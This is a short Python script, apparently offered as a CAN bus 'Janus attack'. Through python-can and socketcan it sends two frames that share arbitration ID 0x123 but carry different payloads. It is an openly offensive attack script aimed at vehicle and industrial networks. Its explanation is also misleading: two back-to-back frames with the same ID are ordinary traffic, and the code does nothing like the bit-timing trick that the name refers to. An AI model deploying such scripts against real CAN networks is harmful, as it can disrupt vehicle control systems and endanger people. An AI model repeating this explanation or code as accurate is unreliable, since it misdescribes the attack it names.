# A CAN bus Janus attack is a type of attack on a Controller Area Network (CAN) bus, 
# where an attacker sends malicious messages with duplicate message IDs to confuse or 
# disrupt the communication between the devices on the network. This type of attack 
# is known as a "Janus attack" because it has two faces, where the attacker sends messages 
# with two different payloads but the same message ID.

# credits to Dr. Ken Tindell for discovering this attack
import can

# Define the CAN bus interface
bus = can.interface.Bus(bustype='socketcan', channel='can0')

# Define the two payloads for the Janus attack
payload1 = b'\x11\x22\x33\x44'
payload2 = b'\x55\x66\x77\x88'

# Send the two messages with the same ID to perform the Janus attack
msg1 = can.Message(arbitration_id=0x123, data=payload1)
msg2 = can.Message(arbitration_id=0x123, data=payload2)
bus.send(msg1)
bus.send(msg2)
